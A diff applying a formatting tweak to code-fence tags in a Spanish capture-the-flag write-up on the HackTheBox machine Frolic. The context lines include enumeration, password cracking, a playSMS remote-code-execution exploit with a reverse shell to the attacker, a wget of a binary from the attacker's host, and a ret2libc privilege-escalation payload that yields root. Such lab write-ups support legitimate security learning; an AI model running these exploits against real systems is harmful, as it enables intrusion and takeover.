@@ -26,7 +26,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- 10.10.10.111 --open -v -n
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 13:44 CST
 Initiating Ping Scan at 13:44
@@ -64,7 +64,7 @@ Nmap done: 1 IP address (1 host up) scanned in 137.06 seconds
 
 Corroboremos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.111
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-03 16:59:55 GMT
@@ -88,7 +88,7 @@ Como podemos ver los puertos son los mismos en TCP, por lo que iniciamos por ide
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sS -sV -p22,139,445,1880,9999 10.10.10.111
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-03 13:50 CST
 Nmap scan report for 10.10.10.111
@@ -117,7 +117,7 @@ Concluimos que tenemos carpetas compartidas, dos servidores Web y uno ssh.
 
 Vamos a lanzar unos amigables gobuster sobre el puerto TCP/9999 de frolic, concatenando las carpetas descubiertas:
 
-```text
+``` text
 xbytemx@laptop:~$ ~/tools/gobuster -u http://10.10.10.111:9999/ -w ~/git/SecLists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt
 
 =====================================================
@@ -267,7 +267,7 @@ Tenemos varias respuestas interesantes, pero de momento, enfoquemos nos en la ca
 
 Como a mi me gusta mostrar los resultados de las pruebas en lugar de _imágenes_ usemos HTTPie para efectuar la navegación hacia la pagina:
 
-```text
+``` text
 xbytemx@laptop:~$ http http://10.10.10.111:9999/admin/
 HTTP/1.1 200 OK
 Connection: keep-alive
@@ -307,7 +307,7 @@ Transfer-Encoding: chunked
 
 Encontramos un form que hace la validación de los usuarios en el portal de admin. Veamos sin encontramos algo en el archivo login.js porque para loggear se ejecuta validate().
 
-```text
+``` text
 xbytemx@laptop:~$ http http://10.10.10.111:9999/admin/js/login.js
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -347,7 +347,7 @@ Si prestamos atención, tenemos un if donde tenemos unas credenciales hardcodead
 
 # success.html
 
-```text
+``` text
 xbytemx@laptop:~$ http --form http://10.10.10.111:9999/admin/success.html
 HTTP/1.1 200 OK
 Connection: keep-alive
@@ -389,7 +389,7 @@ Se trata de otro tipo de lenguaje esotérico, llamado `Ook`, el cual puede ser i
 
 Afortunadamente existe un paquete en Debian para convertir este tipo de lenguajes, `esco`.
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/admin/success.html | sed 's/\./Ook\. /g' | sed 's/\!/Ook\! /g' | sed 's/\?/Ook\? /g' > success-resp.OoK
 xbytemx@laptop:~/htb/frolic$ ~/git/esco/src/esco -t ook success-resp.OoK
 == Begin of execution ==
@@ -402,7 +402,7 @@ Nothing here check /asdiSIAJJ0QWE9JAS
 
 Ok, continuamos nuestro camino hacia la carpeta revelada:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/
 HTTP/1.1 200 OK
 Connection: keep-alive
@@ -423,7 +423,7 @@ AAAAAAEAAQBPAAAAAwEAAAAA
 
 A este si lo conozco, es base64. Realicemos el decoding:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | strings
 index.phpUT
 &q2o
@@ -432,14 +432,14 @@ index.phpUT
 
 Ah? Sera esto algun archivo?
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | file -
 /dev/stdin: Zip archive data, at least v2.0 to extract
 ```
 
 Ok, se trata de un ZIP, pasemos la salida a archivo con `xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > asdiSIAJJ0QWE9JAS.zip` y después al tratarlo de decomprimir nos pedirá una contraseña, la cual no tenemos pero podemos conseguir con john the ripper:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ ~/git/JohnTheRipper/run/zip2john asdiSIAJJ0QWE9JAS.zip
 ver 2.0 efh 5455 efh 7875 asdiSIAJJ0QWE9JAS.zip->index.php PKZIP Encr: 2b chk, TS_chk, cmplen=176, decmplen=617, crc=145BFE23
 asdiSIAJJ0QWE9JAS.zip:$pkzip2$1*2*2*0*b0*269*145bfe23*0*43*8*b0*145b*89c3*5e44e6104a9f73b2688a299a1b9550f06e0ba9bf5373e4024a771a11dc8ee5a034e2f6d98f6bee7ad0128a55c896ec2b58ba7fe050c8e112e1b687a4ead0bbe2785f13c04e895bfd8d8453aaea38f283f2e20f914a3253c72a830344d08d7d933864540e51026bde10cad7e3e4fb6a5f9f8bf918e994c027787f6390c216dd8f74beb2373551ac0b9a8a030e95106b032c34b5d96229be3446b5e90609ffba84e396eae9efc72671326f8857d49ce339*$/pkzip2$:::::asdiSIAJJ0QWE9JAS.zip
@@ -456,7 +456,7 @@ OMG la contraseña es password
 
 Descomprimamos y veamos que hemos conseguido:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ 7z -ppassword x asdiSIAJJ0QWE9JAS.zip
 
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
@@ -483,14 +483,14 @@ Compressed: 360
 
 Tenemos un archivo llamado index.php (da, era el resultado de success.html):
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ cat index.php
 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
 ```
 
 Eso parece hexadecimal, porque tenemos algunos `\x0d\x0a` que normalmente indica una nueva linea, por lo que convirtamos estos a ascii:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r
 KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
 KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
@@ -500,7 +500,7 @@ LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
 
 Por los caracteres finales de `==` puede ser base64, ya que el encoding de b64 usa un panding con caracteres `=`. Probemos:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r | base64 -d
 +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+base64: entrada inválida
 xbytemx@laptop:~/htb/frolic$ man base64
@@ -513,7 +513,7 @@ xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r | base64 -di
 
 Esta salida no es más que brainfuck, otro lenguaje esotéricos hecho por diversión. Lo podemos reconocer porque esta separado por espacios cada 5 caracteres y sus caracteres principales son `[.+<>]`. Convertimos y ejecutamos este lenguaje por su respectivo interprete:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ cat index.php | xxd -ps -r | base64 -di > index.bf
 xbytemx@laptop:~/htb/frolic$ beef index.bf
 idkwhatispass
@@ -526,7 +526,7 @@ Parece que tenemos otras credenciales y hemos llegado a un punto muerto en este 
 
 Como `gobuster` no es la herramienta mas eficiente cuanto se trata de recursividad de carpetas, decidí lanzar `dirb` como una segunda opción:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ dirb http://10.10.10.111:9999
 
 -----------------
@@ -577,7 +577,7 @@ DOWNLOADED: 36896 - FOUND: 5
 
 El ultimo resultado llamo mucho mi atención, veamos de que se trata:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ http http://10.10.10.111:9999/dev/backup/
 HTTP/1.1 200 OK
 Connection: keep-alive
@@ -597,7 +597,7 @@ ok, gracias por la información sobre otro directorio que no saldría sino pasar
 
 Veamos que tenemos en `/playsms`:
 
-```text
+``` text
 xbytemx@laptop:~$ http http://10.10.10.111:9999/playsms/
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -615,7 +615,7 @@ X-Frame-Options: SAMEORIGIN
 
 Interesante, parece que nos hemos topado con algún tipo de aplicación. Investigamos exploits para esta webapp:
 
-```text
+``` text
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit playsms
 [i] Found (#1): /home/xbytemx/git/exploit-database/files_exploits.csv
 [i] To remove this message, please edit "/home/xbytemx/git/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array:
@@ -647,7 +647,7 @@ Parece que hay muchas opciones pero de momento desconocemos la versión que tene
 
 Aprovechemos que `metasploit-framework` tiene un exploit para esta versión que genera un RCE:
 
-```text
+``` text
 xbytemx@laptop:~/git/exploit-database$ msfconsole
 Found a database at /home/xbytemx/.msf4/db, checking to see if it is started
 Starting database at /home/xbytemx/.msf4/db...success
@@ -757,7 +757,7 @@ Mode              Size   Type  Last modified              Name
 
 Hemos podido identificar correctamente el exploit al cual es vulnerable esta aplicación que básicamente consiste en subir un archivo CVS que contiene código en PHP que ejecuta el contenido de las variables que controla el browser como User-Agent. La verdad me gusto mucho lo simple que era este exploit, por lo que decidí hacer mi propia versión:
 
-```python
+``` python
 #!/usr/bin/env python2
 
 import requests, re, random, netifaces
@@ -858,12 +858,12 @@ if __name__ == '__main__':
 
 Como dato importante, es que la versión que uso de requests es la mas nueva (2.5.3) para python2. Le agregue como plus que si le paso como comando `exploit`, crearía un reverse shell hacia mi maquina en el puerto 3001. Tras ejecutar el script y ejecutar exploit, tendremos un acceso a frolic como www-data:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ python connect.py
 $ exploit
 ```
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ ncat -lnp 3001
 $ ls -lah
 ls -lah
@@ -923,7 +923,7 @@ Como `user.txt` es global readable, podemos leerlo desde www-data
 
 Para el privilage escalation, encontramos un directorio interesante en el home de Ayush, el cual se llama `.binary`:
 
-```text
+``` text
 $ ls -lah /home/ayush/.binary
 ls -lah /home/ayush/.binary
 total 16K
@@ -937,7 +937,7 @@ Vemos que se trata de un binario que tiene un SETUID bit para root, pero lo que 
 
 Decidí extraer el binario para analizarlo por fuera, esto vía Base64:
 
-```text
+``` text
 $ base64 /home/ayush/.binary/rop
 f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIMECDQAAABgGAAAAAAAADQAIAAJACgAHwAcAAYAAAA0
 AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEA
@@ -1076,14 +1076,14 @@ AAAAAAABAAAAAAAAAA==
 
 Perfecto, ahora veamos que mas hay por aquí:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ file rop
 rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
 ```
 
 Vemos que se trata de un binario enlazado dinámicamente, por lo que tenemos que también considerar a que se enlaza:
 
-```text
+``` text
 $ ldd /home/ayush/.binary/rop
         linux-gate.so.1 >  (0xb7fda000)
         libc.so.6 > /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
@@ -1093,7 +1093,7 @@ $ ldd /home/ayush/.binary/rop
 
 Nada anormal aquí. Continuemos con radare2:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ r2 rop
 [0x080483a0]> aaaa
 [x] Analyze all flags starting with sym. and entry0 (aa)
@@ -1217,7 +1217,7 @@ Analicemos con checksec:
 
 Tenemos habilitado NX que no nos permite ejecutar cosas en el stack, no tenemos canarios que estén entrando y saliendo al stack, ni PIE ni ASLR:
 
-```text
+``` text
 $ cat /proc/sys/kernel/randomize_va_space
 0
 ```
@@ -1239,7 +1239,7 @@ El ultimo requerimiento es básicamente para que cuando llame a _system_, pueda 
 
 Ya habíamos encontrado la dirección base de _libc_ vía `ldd`, la cual no cambia porque la protección global no esta habilitada (address space layout randomization), ahora solo falta resolver como llegar a _system_ y _exit_. Eso lo podemos hacer ejecutando `readelf` sobre `libc.so.6` dentro o fuera de frolic. En mi caso lo hice fuera:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ readelf -s libc.so.6 | grep -E " (system|exit)@@"
    141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
@@ -1247,7 +1247,7 @@ xbytemx@laptop:~/htb/frolic$ readelf -s libc.so.6 | grep -E " (system|exit)@@"
 
 Básicamente liste todos los símbolos dentro de la biblioteca, los cuales son los entry points para las funciones. Concatene esa salida a grep y por un regex filtre system y exit, obteniendo donde se encuentran dentro de _libc_. Ahora sumamos esta dirección (offset) + la base de donde se encuentra dentro de la memoria _libc_, y tenemos la ubicación de la función durante la ejecución:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ rax2 -k 0x0002e9d0+0xb7e19000
 0xb7e479d0
 xbytemx@laptop:~/htb/frolic$ rax2 -k 0xb7e19000+0x0003ada0
@@ -1270,7 +1270,7 @@ int main(int argc, char **argv)
 
 Lo primero y obligado, es declarar SHELL o cualquier otra variable con el string "/bin/sh". Compilamos el código y generamos un binario para x86:
 
-```text
+``` text
 xbytemx@laptop:~/htb/frolic$ cat getSHELLenvvar.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1287,7 +1287,7 @@ xbytemx@laptop:~/htb/frolic$ gcc -m32 -o getSHELLenvvar getSHELLenvvar.c
 
 Subimos el binario generado a frolic y lo ejecutamos:
 
-```text
+``` text
 $ cd /dev/shm
 $ wget http://10.10.12.82:4001/getSHELLenvvar
 --2019-03-22 10:22:53--  http://10.10.12.82:4001/getSHELLenvvar
@@ -1309,7 +1309,7 @@ Donde, ahora tenemos la dirección de donde esta el string "/bin/sh".
 
 Ahora que tenemos todos los requerimientos construimos el ret2libc y ejecutamos rop con sus argumentos vía python. Recordemos que debido a como el endianess funciona en x86, hay que invertir el orden de los pares de bytes (32bits):
 
-```text
+``` text
 $ /home/ayush/.binary/rop $(python -c 'print "B"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\xbd\xff\xff\xbf"')
 id
 uid=0(root) gid=33(www-data) groups=33(www-data)
@@ -1319,7 +1319,7 @@ pwd
 
 # `cat root.txt`
 
-```text
+``` text
 cat /root/root.txt
 ```
 
